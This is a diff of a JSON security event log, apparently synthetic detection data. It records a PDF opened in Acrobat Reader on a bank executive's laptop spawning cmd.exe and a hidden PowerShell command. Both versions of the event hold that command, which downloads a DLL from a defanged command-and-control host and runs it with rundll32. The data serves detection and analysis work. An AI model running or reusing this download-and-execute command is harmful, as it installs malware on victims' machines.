@@ -1,7 +1,7 @@
 {
   "metadata": {
     "event_timestamp": "2025-12-06T09:05:10Z",
-    "event_type": "PROCESS_CREATION",
+    "event_type": "PROCESS_LAUNCH",
     "product_name": "Google SecOps Agent",
     "vendor_name": "Google",
     "description": "CMD process launched PowerShell to execute a malicious download command from a C2 domain (Stage 2 execution)."
@@ -9,41 +9,62 @@
   "principal": {
     "user": {
       "userid": "user-sid-12345",
-      "email_address": "richard.sterling@grandbank.corp",
-      "username": "richard.sterling",
-      "domain": "GRANDBANK"
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+    "file": {
+      "md5": "f2a12ebc66a143119d82dca771e2f07b",
+      "sha1": "846e152aaf4821dab53c1a24cd683115ee9bb98a",
+      "sha256": "",
+      "full_path": "C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe"
     },
     "process": {
+      "pid": "5920",
       "file": {
-        "full_path": "C:\\Windows\\System32\\cmd.exe",
-        "file_name": "cmd.exe",
-        "md5": "3b4f8c21edab51ff72d2655fdde53312"
+        "full_path": "C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe"
       },
-      "process_id": "6540",
-      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c \"Invoke-WebRequest ... (truncated for clarity)\"",
-      "creation_time": "2025-12-06T09:05:09Z"
+      "command_line": "\"C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe\" \"C:\\Users\\Richard\\Downloads\\Q3_Financials_Review.pdf\"",
+      "parent_process": {
+        "command_line": "",
+        "file": {
+          "full_path": "C:\\Windows\\explorer.exe"
+        }
+      }
     }
   },
   "target": {
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+    "file": {
+      "md5": "3b4f8c21edab51ff72d2655fdde53312",
+      "sha1": "9a7d5f1b8d21431e81e888e98a037ef1293c5db4",
+      "sha256": "",
+      "full_path": "C:\\Windows\\System32\\cmd.exe"
+    },
     "process": {
       "file": {
-        "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "file_name": "powershell.exe"
+        "full_path": "C:\\Windows\\System32\\cmd.exe"
       },
-      "process_id": "8120",
-      "command_line": "powershell -nop -w hidden -c \"Invoke-WebRequest 'hxxps://malicious-update-storage.eastus.cloudapp[.]azure.com' -OutFile 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll'; Start-Sleep -Seconds 5; rundll32.exe 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll',EntryPoint\"",
-      "creation_time": "2025-12-06T09:05:10Z"
+      "pid": "6540",
+      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c \"Invoke-WebRequest 'hxxps://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll' -OutFile 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll'; Start-Sleep -Seconds 5; rundll32.exe 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll',EntryPoint\"",
+      "parent_process": {
+        "command_line": "\"C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe\" \"C:\\Users\\Richard\\Downloads\\Q3_Financials_Review.pdf\"",
+        "file": {
+          "full_path": "C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe"
+        }
+      }
     }
-  },
-  "observer": {
-    "hostname": "ceo-laptop01.grandbank.corp",
-    "vendor_name": "Google"
   },
   "security_result": [
     {
+      "action": "ALLOW",
       "category": "SOFTWARE_MALICIOUS",
       "severity": "HIGH",
-      "threat_name": "Suspicious_PowerShell_Execution_C2"
+      "severity_details": "Suspicious child process creation detected (AcroRd32.exe spawning cmd.exe with obfuscated PowerShell command lines). The process creation was allowed to proceed as per monitoring policy.",
+      "threat_name": "Suspicious_Child_Process_Creation"
     }
   ]
 }
